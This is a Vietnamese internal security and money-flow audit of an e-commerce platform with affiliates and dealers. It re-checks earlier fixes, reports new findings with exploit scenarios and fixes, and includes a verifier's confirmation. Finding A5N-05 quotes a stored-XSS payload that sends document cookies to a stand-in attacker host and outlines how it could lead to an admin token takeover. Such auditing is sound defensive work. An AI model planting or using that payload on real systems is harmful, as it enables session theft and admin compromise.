# A5 — Rà soát An toàn + Dòng tiền (Security & Money)

- **Ngày:** 2026-10-09
- **Commit:** `080bc75` (nhánh `hardening/2026-10`)
- **Phạm vi:** Xác thực/phân quyền, IDOR, whitelist DTO / mass-assignment, rate limit, rò rỉ PII & giá sỉ, upload, webhook (chữ ký/idempotency/replay), refresh-token cookie/CSRF, lưu token miniapp; và toàn bộ dòng tiền: giá đơn, coupon, hoàn tiền, TubuXu, hoa hồng CTV, công nợ/thưởng đại lý, cashback/referral, lương, ví. Kèm tái kiểm 22 P0 của `docs/audit-2026-09/00-MASTER-SUMMARY.md`, các bản vá prod-readiness 2026-09-16 và overnight 2026-09-08.
- **Phương pháp:** đọc mã nguồn + kiểm chứng động trên API local cổng 3001 (JWT HS256 tự ký bằng `JWT_ACCESS_SECRET`). Fixture tiền tố `sec-a5-` đã **tạo và xoá sạch** (kiểm lại 0 dòng trên mọi bảng có cột id/userId/orderId…). Mỗi phát hiện ghi rõ **[ĐỘNG]** (có curl + output thật) hay **[ĐỌC MÃ]** (chỉ tĩnh).
- **Giới hạn:** CHỈ ĐỌC/ĐO, không sửa `apps/**`/`packages/**`, không deploy, không gọi dịch vụ ngoài thật, không đụng PROD. `NODE_ENV=development` và **không secret tích hợp nào được set** trong `.env` local → **không kiểm chứng động được đường fail-closed của webhook ở production** (chỉ đọc mã). Không chạy migrate. Không đổi nhánh/không git ghi.

---

## Phần 1 — Tái kiểm bản vá cũ

### 1a. 22 P0 của audit 2026-09 (`docs/audit-2026-09/00-MASTER-SUMMARY.md`)

| ID audit | Nội dung | Kết luận | Bằng chứng |
|---|---|---|---|
| A2-01=A5-02=A6-03 | QR/STK chuyển khoản vào TK CTV | **VẪN ĐỨNG** | `bank-transfer.service.ts:43-54` luôn dùng `payment.bank_*` của Tubu, bỏ qua `storefrontSlug` [ĐỌC MÃ] |
| A2-03=A5-06=A6-04 | SP chưa duyệt vẫn bán | **VẪN ĐỨNG (một phần)** | `catalog.service.ts:128,214` lọc `isActive+APPROVED`; `getBySlug:199` chặn; `cart.service.ts:123` chặn addItem. **Hở:** giỏ cũ có sẵn dòng SP sau bị từ chối vẫn mua được — xem **A5N-04** [ĐỘNG] |
| A2-02=A6-01 | Web chọn CK nhưng không hiện QR | **VẪN ĐỨNG** | `web/.../thanh-toan/page.tsx:25,157` render `<BankTransferPanel order={placed}/>` [ĐỌC MÃ] |
| A5-03=A6-02 | CTV/đại lý tự "giao ảo" | **VẪN ĐỨNG** | `merchant.service.ts:535` `updateMerchantOrderStatus` ném Forbidden nếu `role!=='ADMIN'` [ĐỌC MÃ] |
| A5-04=A6-36 | `/merchant/orders` lộ tên/SĐT/địa chỉ khách | **VẪN ĐỨNG (một phần)** | `merchant.service.ts:508-516` mask tên/SĐT/địa chỉ cho non-admin. **Hở mới:** `note`, `invoiceRequest`, `userId`, `referrerUserId` KHÔNG mask — xem **A5N-02** [ĐỘNG] |
| A1-01=A2-06=A3-02 | REORDER_REMINDER ngõ cụt | **VẪN ĐỨNG** (ngoài phạm vi tiền; có `productSlug` ở payload) | `lifecycle.service.ts:88-100` ORDER BY + slug [ĐỌC MÃ] |
| A2-07=A3-03=A6-31 | Cron nhắc mua lại tự dừng >500 | **VẪN ĐỨNG** | `lifecycle.service.ts:82-100` HAVING loại cặp đã nhắc + ORDER BY FIFO + `QUERY_FETCH_CAP` [ĐỌC MÃ] |
| A5-08=A6-05 | Payout không có luồng duyệt | **VẪN ĐỨNG** | `payout-admin.controller.ts:46-56` approve/reject/mark-paid, `@Roles('ADMIN')` [ĐỌC MÃ] |
| A1-02 | Nhiệm vụ Vườn Xanh hứa mà không cộng | **VẪN ĐỨNG** | `game.service.ts:489-505` `claimMission` ghi `missionProgress.create` [ĐỌC MÃ] |
| A1-03 | Xoá tài khoản chỉ snackbar giả | **VẪN ĐỨNG** | `users.controller.ts:35` `POST me/deletion-request` đã tồn tại [ĐỌC MÃ] |
| A3-01 | Không kênh ngoài app | **VẪN ĐỨNG nửa code** | `notifications.service.ts:67` gửi ZNS khi `zaloTemplateId`; miniapp gọi `followOA`/`requestNotifyPermission` (`settings.tsx:6`, `order-detail.tsx:112`). Nửa còn lại cần Zalo duyệt mẫu (ngoài phạm vi) [ĐỌC MÃ] |
| A3-04 | Voucher sinh nhật farm bằng đổi dob | **VẪN ĐỨNG** | `users.service.ts:53` `updateMany where dob:null` khoá 1 lần. **Lưu ý còn hở nhẹ** birthday cron không chặn guest — xem **A5N-08** [ĐỌC MÃ] |
| A3-05 | Quyền lợi hạng không thực thi | **VẪN ĐỨNG** | `checkout.service.ts:560-570` cộng `tierDiscount` theo `membershipTier.discountPct` [ĐỌC MÃ] |
| A5-01 | Slug gian hàng hạ chữ thường → referrer null | **VẪN ĐỨNG** | `affiliate.service.ts:91` `referralCode.toUpperCase()` khi tra khớp [ĐỌC MÃ] |
| A5-05 | `/merchant/products` lộ dealerPrices/affiliateRate | **VẪN ĐỨNG** | `merchant.service.ts:376` `stripPricingInternals` ẩn khi `role==='AFFILIATE'` [ĐỌC MÃ] |
| A5-07 | Rút hoa hồng ×1.5 (in tiền) | **VẪN ĐỨNG** | `affiliate.service.ts:677` `const credited = total;` (1:1), không nhân hệ số [ĐỌC MÃ] |
| A5-09 | Đại lý tự "Báo đã CK" xoá nợ | **VẪN ĐỨNG** | `dealer.service.ts:317` `reportCreditPayment` đổi sang notify-only [ĐỌC MÃ] |
| A5-10 | Upload CCCD base64 chặn đăng ký đại lý | **KHÔNG KIỂM CHỨNG ĐỘNG** (phụ thuộc build Zalo) | DTO `dealer.dto.ts` nhận URL; spec `dealer.dto.spec.ts` chặn base64 — cấu hình Cloudinary thực tế trên Zalo chưa verify [ĐỌC MÃ] |
| A5-11 | Dashboard CTV cộng cả REJECTED | **VẪN ĐỨNG** | `affiliate.service.ts:818,834` `status:{not:REJECTED}` [ĐỌC MÃ] |
| A6-06 | Duyệt hoàn tiền COD không hoàn thật | **VẪN ĐỨNG** | `order-reversal.service.ts:76` `isCodCollected = COD && DELIVERED` → hoàn về ví [ĐỌC MÃ]. **Nhưng tạo ra A5N-01** |
| A6-07 | Tab duyệt SP đối tác crash `.map` | **VẪN ĐỨNG** | `admin-client.ts:651-653` `asPage(res,...)` chuẩn hoá `{data,meta}` [ĐỌC MÃ] |
| A7-01 | Phiên khách bị đổi sang Zalo khác lúc đặt | **VẪN ĐỨNG** | `auth.service.ts:239-345` `mergeGuestInto` gộp giỏ/địa chỉ/số dư, reparent cart. **Nhưng tạo ra A5N-06** [ĐỌC MÃ] |

**Tổng tái kiểm 22 P0:** 20 VẪN ĐỨNG, 1 nửa-code đúng thiết kế (A3-01), 1 không kiểm chứng động được (A5-10). Không P0 nào HỎNG LẠI. Hai bản vá (A6-06, A7-01) tuy "đứng" nhưng để lộ hệ quả tiền mới (A5N-01, A5N-06).

### 1b. Prod-readiness 2026-09-16 & overnight 2026-09-08

| Mục | Kết luận | Bằng chứng |
|---|---|---|
| ZaloPay resurrect đơn huỷ | **VẪN ĐỨNG** | `zalopay.service.ts:164` flip guard `status:{notIn:['CANCELLED','RETURNED']}`; callback lệch tiền `:122-123` không lật PAID [ĐỌC MÃ] |
| Coupon farm | **VẪN ĐỨNG** | `coupons.service.ts:116` `updateMany where usedCount<usageLimit` + advisory lock + P2002 idempotent [ĐỌC MÃ] |
| Lộ giá sỉ qua API public | **VẪN ĐỨNG** | `catalog.service.ts:48` `publicVariationSelect` không có dealerPrices/affiliateRate; curl xác nhận [ĐỘNG] |
| Cron sập cả API (unhandledRejection) | **VẪN ĐỨNG** | `main.ts:89` handler nuốt rejection [ĐỌC MÃ] |
| Pancake stock (overnight P0-3) | **VẪN ĐỨNG** | `variation-stock.ts:58` UPDATE atomic theo stock [ĐỌC MÃ] |
| Refresh token web → cookie HttpOnly | **VẪN ĐỨNG** | `refresh-cookie.ts:75-81` httpOnly, path `/api/auth`, sameSite lax, secure ở prod [ĐỌC MÃ] |
| Đại lý đặt trước hàng chưa về (backorder) | **VẪN ĐỨNG** | `dealer.service.ts:216-223` giữ tối đa + `backorderedQty` [ĐỌC MÃ] |
| dob một lần (A3-04) | **VẪN ĐỨNG** | `users.service.ts:53` [ĐỌC MÃ] |
| IDOR đơn/địa chỉ/bank-qr/cancel | **VẪN ĐỨNG (verify động)** | đọc đơn người khác 404, PATCH địa chỉ người khác 403, cancel 404 [ĐỘNG] |
| Mass-assignment PATCH /me | **VẪN ĐỨNG (verify động)** | gửi `{role:ADMIN,walletBalance:999999}` → 400 `property role should not exist` [ĐỘNG] |

---

## Phần 2 — Phát hiện mới / còn mở

### A5N-01 · **P0** · Hoàn tiền đơn CTV "lên đơn hộ" chảy vào ví CTV, không về khách

- **Bằng chứng:** `order-reversal.service.ts:104,121-122` hoàn `order.total` về `walletBalance`/`coinsBalance` của `order.userId`. Với đơn CTV lên hộ, `order.userId = ctvId` (`affiliate.service.ts:278` đặt order cho CTV, khách chỉ là snapshot `shippingAddress`). **[ĐỘNG]** CTV `sec-a5-ctvr` lên đơn BANK_TRANSFER 200.000đ cho khách; admin lật PAID; CTV `POST /orders/{code}/cancel` → đơn `CANCELLED/REFUNDED`, `users.walletBalance` của **CTV = 200000**. Khách đã chuyển khoản không nhận lại đồng nào.
- **Tác động:** Tiền. Khách trả tiền cho đơn CTV lên hộ, khi huỷ/trả thì tiền hoàn vào ví CTV; khách mất trắng. Quy mô càng lớn khi CTV lên đơn chuyển khoản hộ nhiều khách.
- **Kịch bản khai thác:** CTV lên đơn BANK_TRANSFER hộ khách A → khách A chuyển khoản cho Tubu → admin xác nhận PAID → CTV tự bấm huỷ đơn (được phép vì là chủ đơn) → 200k vào ví CTV → CTV rút qua payout. Lặp lại với nhiều khách.
- **Đề xuất:** Hoàn tiền đơn `placedForCustomer` phải về tài khoản/kênh của **khách thật** (định danh qua SĐT snapshot) chứ không về `order.userId`; hoặc chặn CTV tự huỷ đơn đã PAID, bắt buộc admin xử lý hoàn. Trước mắt: cấm đường `cancel` của CTV với đơn `placedForCustomer && paymentStatus=PAID`.
- **Lệnh kiểm chứng:** lặp lại fixture `sec-a5-ctvr` + `POST /api/affiliate/orders` BANK_TRANSFER → `UPDATE orders SET paymentStatus='PAID'` → `POST /api/orders/{code}/cancel` → `SELECT walletBalance FROM users`.
- Công sức **M** · Model **opus** · Nhóm: `apps/api/src/modules/orders/order-reversal.service.ts`, `apps/api/src/modules/affiliate/affiliate.service.ts`, `apps/api/src/modules/orders/orders.controller.ts` · **MỚI** (hệ quả mới lộ từ bản vá A7-01/đặt đơn hộ, chưa có trong audit 2026-09).

### A5N-02 · **P1** · `/merchant/orders` rò `invoiceRequest` (mã số thuế, công ty, email), `note`, `userId`, `referrerUserId` cho CTV

- **Bằng chứng:** `merchant.service.ts:495-516` chỉ mask `user.fullName/phone` và `shippingAddress`; `order.note`, `order.invoiceRequest`, `order.userId`, `order.referrerUserId` trả nguyên. **[ĐỘNG]** CTV `sec-a5-ctv` gọi `GET /merchant/orders` nhận: `note:"...SDT rieng 0912345678..."`, `invoiceRequest:{email:"ketoan@seca5.vn",taxCode:"0312345678",companyName:"Cong ty TNHH SecA5",address:"99 Nguyen Hue"}`, `userId:"sec-a5-cust"`.
- **Tác động:** PII/dữ liệu DN. `note` thường chứa SĐT phụ của khách (vô hiệu hoá việc mask SĐT chính), `invoiceRequest` lộ mã số thuế + email kế toán + địa chỉ công ty — rủi ro pháp lý và phá kênh (CTV chăm khách qua kênh riêng).
- **Kịch bản khai thác:** Bất kỳ ai đăng ký CTV 1 chạm → `GET /merchant/orders` → thu thập mã số thuế/email/SĐT phụ của mọi khách mua qua gian hàng mình (kể cả khách chỉ "chạm" link).
- **Đề xuất:** Với non-admin, loại bỏ `invoiceRequest`, `userId`, `referrerUserId` khỏi payload và mask SĐT trong `note` (hoặc bỏ `note`).
- **Lệnh kiểm chứng:** fixture đơn có `invoiceRequest`+`note` chứa SĐT → `GET /api/merchant/orders` với JWT role AFFILIATE.
- Công sức **S** · Model **sonnet** · Nhóm: `apps/api/src/modules/merchant/merchant.service.ts` · **MỞ RỘNG từ A5-04** (phần tên/SĐT/địa chỉ đã vá, các trường này chưa).

### A5N-03 · **P1** · Đại lý KHÔNG tier bỏ qua hoàn toàn hạn mức công nợ (mua CREDIT không giới hạn)

- **Bằng chứng:** `dealer.service.ts:195,209` kiểm hạn mức chỉ nằm trong `if (onCredit && tier)`. Đại lý được duyệt nhưng chưa gán tier (`dealerContext:1414` chấp nhận tier null) → nhánh kiểm bị bỏ qua, đơn CREDIT tạo thẳng `status:CONFIRMED`. **[ĐỘNG]** đại lý `sec-a5-dealer` (tier null) đặt CREDIT 20000×80000 = **1.600.000.000đ** → HTTP 201, `dealer_credit_ledgers` ghi nợ 1,6 tỷ, không chặn.
- **Tác động:** Tiền/vốn shop. Đại lý ôm hàng công nợ vô hạn khi chưa gán tier.
- **Kịch bản khai thác:** Đăng ký đại lý → được duyệt nhưng admin chưa set tier → đặt loạt đơn CREDIT giá trị lớn → nhận hàng → không trả nợ.
- **Đề xuất:** Khi `onCredit && !tier` → từ chối (`creditLimit` mặc định = 0). Tách điều kiện: `if (onCredit) { const limit = tier?.creditLimit ?? 0; ... }`.
- **Lệnh kiểm chứng:** JWT role DEALER (user không tier) → `POST /api/dealer/orders` paymentMethod CREDIT.
- Công sức **S** · Model **sonnet** · Nhóm: `apps/api/src/modules/dealer/dealer.service.ts` · **MỚI**.

### A5N-04 · **P1** · SP bị từ chối/ẩn vẫn mua được từ giỏ cũ (không re-check ở quote/place-order)

- **Bằng chứng:** `cart.service.ts:40-46` `getCart` dựng line từ mọi `cart item` KHÔNG kiểm `isActive`/`approvalStatus`; `checkout.service.ts` quote/placeOrderInner không re-check (chỉ `addItem:123` chặn lúc thêm mới). **[ĐỘNG]** thêm SP vào giỏ (201) → `UPDATE products SET approvalStatus='REJECTED',isActive=false` + variation isActive=false → `POST /checkout/quote` trả total 119000 → `POST /checkout/place-order` → đơn `CONFIRMED` 119000 (201), trừ kho. CTV lên đơn hộ cũng vậy (`affiliate.service.ts:280` chỉ kiểm `v.isActive`, không kiểm `product.approvalStatus`).
- **Tác động:** Niềm tin (phá lời hứa "chuẩn xanh đã kiểm định") + vận hành (bán SP admin đã gỡ).
- **Kịch bản khai thác:** Khách/CTV thêm SP vào giỏ khi còn bán → admin từ chối/gỡ SP → giỏ vẫn đặt được → đơn SP cấm lọt vào kho giao.
- **Đề xuất:** `getCart` lọc dòng `product.approvalStatus!=='APPROVED' || !isActive` (báo "đã gỡ"); và re-check trong transaction place-order. CTV path thêm kiểm `product.approvalStatus`.
- **Lệnh kiểm chứng:** như [ĐỘNG] ở trên.
- Công sức **M** · Model **sonnet** · Nhóm: `apps/api/src/modules/cart/cart.service.ts`, `apps/api/src/modules/checkout/checkout.service.ts`, `apps/api/src/modules/affiliate/affiliate.service.ts` · **MỞ RỘNG từ A2-03** (chặn addItem đã vá, re-check lúc đặt chưa).

### A5N-05 · **P2** · Ảnh minh chứng đổi trả nhận URL `javascript:` → stored-XSS trong admin web

- **Bằng chứng:** `orders.controller.ts:9` DTO `images?: string[]` chỉ `@IsString` (không `@IsUrl`). `web/.../admin/page.tsx:1160-1167` render `<img src={img} onClick={()=>window.open(img,'_blank')}>`. **[ĐỘNG]** `POST /orders/{code}/return-request` với `images:["javascript:fetch('https://attacker.example/x?'+document.cookie)"]` → lưu nguyên vào `return_requests.images`.
- **Tác động:** Admin bấm ảnh → `window.open('javascript:...')` chạy mã trong origin admin. Chuỗi khai thác: XSS → gọi `/api/auth/refresh` với `x-client:web` + credentials (cookie HttpOnly tự gửi) để lấy access token admin, hoặc thao tác API admin thay admin. (Mức P2 vì cần admin tương tác + `window.open('javascript:')` bị một số trình duyệt chặn; nâng P1 nếu admin dùng trình duyệt cũ.)
- **Kịch bản khai thác:** Khách bất kỳ gửi yêu cầu đổi trả kèm ảnh `javascript:`/`data:text/html` → nhân viên duyệt đổi trả bấm xem ảnh → mã chạy trong phiên admin.
- **Đề xuất:** DTO `@IsUrl({protocols:['http','https'],require_protocol:true})` cho từng phần tử `images`; admin chỉ render khi `src` bắt đầu `https://`.
- **Lệnh kiểm chứng:** như [ĐỘNG] ở trên + `SELECT images FROM return_requests`.
- Công sức **S** · Model **sonnet** · Nhóm: `apps/api/src/modules/orders/orders.controller.ts`, `apps/web/src/app/admin/page.tsx` · **MỚI**.

### A5N-06 · **P2** · Gộp phiên khách (`ensurePhone`) đọc số dư NGOÀI transaction → đua cộng trùng; nuốt P2002 trong transaction

- **Bằng chứng:** `auth.service.ts:324-327` `increment: guest.pointsBalance/walletBalance/coinsBalance/cashbackPending` dùng số dư đọc ở `mergeGuestInto` **ngoài** `$transaction`. `auth.service.ts:297-314` bắt P2002 và `continue` **bên trong** interactive transaction (`updateMany` pointsTransaction/coinTransaction/cashbackClick/cashbackTransaction). Postgres hủy cả transaction sau lỗi; Prisma interactive tx không có savepoint tự động → nếu `updateMany` thật sự ném P2002, các lệnh sau trong cùng tx sẽ lỗi `25P02`.
- **Tác động:** Tiền (nhỏ, cần đua). Hai lời gọi `ensure-phone` đồng thời (throttle 10/phút, `auth.controller.ts:140`) có thể cộng số dư guest hai lần vào target.
- **Kịch bản khai thác:** Khách có số dư guest → bắn 2 request `ensure-phone` song song cùng lúc → cả hai đọc số dư guest cũ trước khi reset → cộng đôi vào ví target. Khó ổn định nên P2 (chưa chứng minh động được điều kiện đua; đã đọc mã).
- **Đề xuất:** Đọc lại số dư guest **bên trong** transaction (FOR UPDATE) ngay trước increment; đưa `updateMany` dời-sổ ra khỏi tx hoặc dùng `INSERT ... ON CONFLICT DO NOTHING` (raw) thay cho try/catch-nuốt-P2002-trong-tx.
- **Lệnh kiểm chứng:** chưa kiểm chứng động (cần hai request đồng thời có kiểm soát thời điểm).
- Công sức **M** · Model **opus** · Nhóm: `apps/api/src/modules/auth/auth.service.ts` · **MỚI** (hệ quả của bản vá gộp phiên A7-01).

### A5N-07 · **P2** · Client tự tiêm sự kiện analytics "server-authoritative" (`order_paid`) với số tiền tuỳ ý

- **Bằng chứng:** `analytics.controller.ts:98` `POST /events` nhận `eventName` bất kỳ (`ingest-events.dto.ts:9` chỉ `@IsString`). **[ĐỘNG]** khách gửi `{eventName:"order_paid",props:{orderId:"fake",amount:99000000}}` → lưu vào `analytics_events` với `userId=sec-a5-cust2`.
- **Tác động:** Dữ liệu/đo lường. Làm nhiễu bảng sự kiện, lệch số nếu sau này dựng funnel/doanh thu từ `analytics_events`. Hiện **giới hạn**: `analytics-aggregation.service.ts` tính funnel từ bảng `orders` chứ không từ `analytics_events` → chưa ảnh hưởng doanh thu báo cáo.
- **Kịch bản khai thác:** Client bơm hàng loạt `order_paid`/`order_placed` giả để thổi phồng số liệu hoặc che giấu funnel thật trước khi analytics v2 lên.
- **Đề xuất:** Whitelist `eventName` chỉ cho tập event client hợp lệ (`@IsIn([...])`); các event server-authoritative (`order_paid`, `order_placed`) chỉ được ghi từ server (bỏ khỏi danh sách client-ingest).
- **Lệnh kiểm chứng:** như [ĐỘNG] ở trên + `SELECT eventName,userId,props FROM analytics_events WHERE eventId=...`.
- Công sức **S** · Model **sonnet** · Nhóm: `apps/api/src/modules/analytics/analytics.controller.ts`, `apps/api/src/modules/analytics/dto/ingest-events.dto.ts` · **MỚI**.

### A5N-08 · **P2** · Endpoint SP công khai lộ `pancakeId` (ID nội bộ Pancake)

- **Bằng chứng:** **[ĐỘNG]** `GET /api/products/mat-ong-rung-bhnong` trả `pancakeId:"seed-p-bhnong-honey"` ở cả cấp product và variations. `catalog.service.ts:188` `getBySlug` dùng `include` (không `select`) ở cấp product nên trả mọi cột scalar gồm `pancakeId`. `dealerPrices/affiliateRate/pancakeStock` KHÔNG lộ (bản vá cũ VẪN ĐỨNG).
- **Tác động:** Rò ID hệ thống đặt hàng nội bộ Pancake (ánh xạ SP↔Pancake). Không phải tiền trực tiếp, nhưng lộ hạ tầng vận hành.
- **Kịch bản khai thác:** Thu thập toàn bộ ánh xạ `pancakeId` qua API public để phục vụ tấn công/định danh đơn trên Pancake.
- **Đề xuất:** `getBySlug`/list đổi sang `select` tường minh, loại `pancakeId` (và các cột nội bộ) khỏi payload public.
- **Lệnh kiểm chứng:** `curl -s http://localhost:3001/api/products/<slug>` quan sát `pancakeId`.
- Công sức **S** · Model **sonnet** · Nhóm: `apps/api/src/modules/catalog/catalog.service.ts` · **MỚI**.

### A5N-09 · **P2** · Voucher chào mừng/sinh nhật/winback có thể cấp cho tài khoản guest (farm)

- **Bằng chứng:** `vouchers.service.ts:143-146` birthday `SELECT ... WHERE dob IS NOT NULL ... LIMIT 500` không `ORDER BY`, không lọc `role`/guest, không `minOrder`. Welcome: user tạo trong 24h role CUSTOMER chưa có đơn → guest đủ điều kiện. (A3-04 đã khoá farm bằng đổi dob, nhưng guest/sybil vẫn đủ điều kiện nhận.) **[ĐỌC MÃ]** (chủ ý không demo động tạo guest).
- **Tác động:** Rò ngân sách khuyến mãi; voucher cấp cho tài khoản không thật, không tạo đơn thật.
- **Kịch bản khai thác:** Tạo nhiều phiên guest (chỉ cần deviceId, `auth.controller.ts:28`) → mỗi phiên nhận voucher chào mừng; đặt dob → nhận voucher sinh nhật, lặp theo tháng. `LIMIT 500` không ORDER BY còn làm cron birthday tự dừng khi >500 user cùng ngày sinh (cùng lớp lỗi A2-07, hiện chưa vá cho voucher birthday/winback).
- **Đề xuất:** Chỉ cấp voucher cho user đã có `zaloId`/SĐT thật (không guest); thêm `ORDER BY` + phân trang cho birthday/winback như đã làm cho reorder.
- **Lệnh kiểm chứng:** chưa kiểm chứng động (tránh tạo guest; chỉ đọc mã).
- Công sức **M** · Model **sonnet** · Nhóm: `apps/api/src/modules/vouchers/vouchers.service.ts`, `apps/api/src/modules/auth/auth.controller.ts` · **MỚI**.

### A5N-10 · **P3** · Tràn số nguyên khi tổng đơn đại lý quá lớn → 500 INTERNAL_ERROR

- **Bằng chứng:** **[ĐỘNG]** đơn CREDIT quantity 100000 (total 1e10) → `{statusCode:500,code:"INTERNAL_ERROR"}`; quantity 20000 (total 1,6 tỷ) → 201. Cột tiền Int 32-bit tràn khi total vượt ~2,1 tỷ.
- **Tác động:** Độ bền. Lỗi 500 che giấu nghiệp vụ; cần chặn sớm bằng giới hạn giá trị đơn.
- **Đề xuất:** Giới hạn `quantity`/tổng đơn hợp lý (ví dụ total ≤ 2 tỷ) với lỗi 400 thân thiện; cân nhắc BigInt cho cột tiền nếu nghiệp vụ cần.
- **Lệnh kiểm chứng:** `POST /api/dealer/orders` CREDIT quantity 100000.
- Công sức **S** · Model **sonnet** · Nhóm: `apps/api/src/modules/dealer/dealer.service.ts`, `prisma/schema.prisma` · **MỚI**.

### A5N-11 · **P3** · `GET /catalog/search/suggest?q=` không giới hạn độ dài `q`

- **Bằng chứng:** `catalog.controller.ts:58` `@Query('q')` không DTO/`@MaxLength`; `catalog.service.ts:164` `textWhere` fold + LIKE. Truy vấn **được tham số hoá** (`$queryRaw` + `likeContainsPattern` ESCAPE) → **không SQLi**; rủi ro chỉ là CPU với chuỗi rất dài.
- **Tác động:** DoS nhẹ (CPU fold/LIKE trên input khổng lồ). Trùng nightly #13 (CÒN MỞ).
- **Đề xuất:** Giới hạn `q` (ví dụ 100 ký tự) ở controller/DTO.
- **Lệnh kiểm chứng:** `curl "http://localhost:3001/api/catalog/search/suggest?q=<chuỗi dài>"`.
- Công sức **S** · Model **haiku** · Nhóm: `apps/api/src/modules/catalog/catalog.controller.ts` · **CÒN MỞ từ nightly #13**.

---

## Phần 3 — Điểm đã kiểm, KHÔNG phải lỗi (để khỏi rà lại)

- **JWT strategy** `jwt.strategy.ts:19` trả payload không truy DB → đổi role/block chỉ hiệu lực khi access token 15m hết hạn. Đây là đánh đổi thiết kế đã biết (`issueTokens` có check `isBlocked` lúc cấp); ghi nhận, không chấm lỗi mới.
- **Webhook** (Pancake `x-webhook-token`, AccessTrade, Gomdon, Zalo OA) dùng token tĩnh `timingSafeEqual`, **fail-closed ở production** (`zalo-oa-webhook.controller.ts:56`), mở ở dev khi secret rỗng. ZaloPay dùng HMAC key2, callback kiểm MAC + số tiền (`zalopay.service.ts:122`). **Không kiểm chứng động** vì local `NODE_ENV=development` + không secret — chỉ đọc mã. Chưa thấy chống replay/idempotency theo nonce ở webhook token tĩnh (ghi nhận để A-khác xem sâu).
- **IDOR** (đơn/địa chỉ/bank-qr/cancel) và **mass-assignment** (`whitelist+forbidNonWhitelisted`) đã verify động là an toàn.
- **Giá server-authoritative:** quote/place-order tính giá từ DB (`checkout.service.ts:499 compute`), consume flash quota atomic, points FOR UPDATE, coupon advisory lock — verify đọc mã, khớp mô tả bản vá cũ.

---

## Quyết định nghiệp vụ cần chủ dự án

1. **Hoàn tiền đơn CTV lên hộ (A5N-01):** tiền hoàn nên về đâu?
   - **(Khuyến nghị)** Hoàn về **khách thật** theo SĐT snapshot + chặn CTV tự huỷ đơn PAID (admin xử lý hoàn). *Vì:* đúng người trả tiền, chống CTV trục lợi.
   - Giữ hoàn về ví CTV nhưng buộc CTV chuyển lại khách thủ công. *Rủi ro:* không kiểm soát được, dễ mất tiền khách.

2. **Đại lý chưa gán tier (A5N-03):** xử lý đơn CREDIT thế nào?
   - **(Khuyến nghị)** `creditLimit` mặc định = 0 → từ chối CREDIT cho đại lý chưa có tier. *Vì:* an toàn vốn, buộc admin set hạn mức rõ ràng.
   - Cho một hạn mức mặc định nhỏ (ví dụ 2 triệu). *Rủi ro:* vẫn hở nếu admin quên.

3. **SP bị gỡ còn trong giỏ (A5N-04):** ứng xử khi khách đã có trong giỏ?
   - **(Khuyến nghị)** Lọc khỏi giỏ + báo "sản phẩm đã ngừng bán", re-check lúc đặt. *Vì:* nhất quán lời hứa kiểm định.
   - Chỉ cảnh báo, vẫn cho đặt. *Không khuyến nghị.*

4. **Voucher cho guest (A5N-09):** có cấp cho tài khoản chưa có SĐT/Zalo thật không?
   - **(Khuyến nghị)** Chỉ cấp cho user có `zaloId`/SĐT thật. *Vì:* chống farm, ngân sách đến tay khách thật.
   - Giữ nguyên (cấp cả guest). *Rủi ro:* rò ngân sách khuyến mãi.

5. **Event analytics client (A5N-07):** có whitelist eventName không?
   - **(Khuyến nghị)** Whitelist; chặn client ghi `order_paid`/`order_placed`. *Vì:* bảo toàn tính đúng của analytics v2 sắp dựng.
   - Để mở, lọc ở tầng báo cáo. *Rủi ro:* dữ liệu bẩn khó truy vết.

---

## Kiểm chứng độc lập (verifier)

- **Ngày:** 2026-10-09 · **Commit:** `080bc75` (nhánh `hardening/2026-10`) · **Người kiểm:** verifier độc lập (không tin báo cáo A5, mặc định nghi ngờ).
- **Phạm vi:** toàn bộ phát hiện mức P0/P1 của Phần 2 (A5N-01..04) + lấy mẫu 16 khẳng định "VẪN ĐỨNG" ở Phần 1 (bản vá cũ liên quan tiền/bảo mật).
- **Phương pháp:** đọc lại mã nguồn tại commit hiện tại (file:line bên dưới) + `psql SELECT` chỉ đọc trên DB local `tubutree`. **Không** tái chạy fixture động (tránh ghi vào DB dùng chung); bằng chứng mã nguồn đủ kết luận cho cả 4 mục. Đã kiểm fixture `sec-a5-*` của A5 đã dọn: `SELECT count(*) FROM users WHERE id LIKE 'sec-a5-%'` → `0`; `orders WHERE "userId" LIKE 'sec-a5-%'` → `0`.

### Bảng phán quyết P0/P1

| ID | Phán quyết | Bằng chứng (verifier tự kiểm) | Mức đề xuất |
|---|---|---|---|
| A5N-01 | **XÁC NHẬN** | `affiliate.service.ts:323` đơn lên hộ tạo với `userId: ctvId` (+`placedForCustomer: true` :337, `paymentStatus:'UNPAID'`). `order-reversal.service.ts:104,121` hoàn XU/ví về `where: { id: order.userId }` = CTV, không có nhánh nào xét `placedForCustomer`. `orders.service.ts:141-183` `cancel()` chỉ lọc theo chủ đơn + `assertCustomerCancellable` (:209 cho phép `PENDING_PAYMENT`/`CONFIRMED`, không xét `paymentStatus`) → CTV tự huỷ đơn đã PAID được. Tiền khách vào TK Tubu thật: `bank-transfer.service.ts:48-53` luôn dùng `payment.bank_*`; màn CTV `ctv-order-sheet.tsx:148-156` dẫn CTV tới `/bank-payment/<code>` để **gửi QR cho khách**. Ví rút được: `wallet.service.ts:123` `withdraw`. Thêm (A5 chưa nêu): cùng lỗi với **trả hàng** (`admin.service.ts:156` `reviewReturn` → `reverseFinancials`) và đơn **COD đã giao** bị trả (`order-reversal.service.ts:76` `isCodCollected`) — tiền mặt khách trả cũng hoàn vào ví CTV. Không có spec nào phủ `placedForCustomer` trong `orders/*.spec.ts` (grep rỗng). | **P0** (giữ) |
| A5N-02 | **XÁC NHẬN** | `merchant.service.ts:493-497` `findMany` dùng `include: { items: true, user: {...} }` (không `select`) → trả mọi cột scalar của `Order`. Nhánh non-admin `:507-516` chỉ ghi đè `user.fullName/phone` + `shippingAddress`; `note`, `invoiceRequest`, `userId`, `referrerUserId` (và cả `endCustomerKey` = SĐT người nhận dạng 0xxxxxxxxx, schema `schema.prisma:836`) đi nguyên. Controller `merchant.controller.ts:178-180` cho `DEALER`,`AFFILIATE`,`ADMIN`; đăng ký CTV 1 chạm không duyệt (`affiliate.service.ts:48-56` set role AFFILIATE ngay). Ghi chú: `endCustomerKey` chỉ có ở đơn `placedForCustomer`, nhưng bộ lọc theo `variationId` (`merchant.service.ts:462-469`) cho phép gian hàng có SP nằm trong đơn lên-hộ của CTV **khác** thấy SĐT đó → đề xuất sửa nên chuyển sang `select` tường minh thay vì vá từng trường. | **P1** (giữ) |
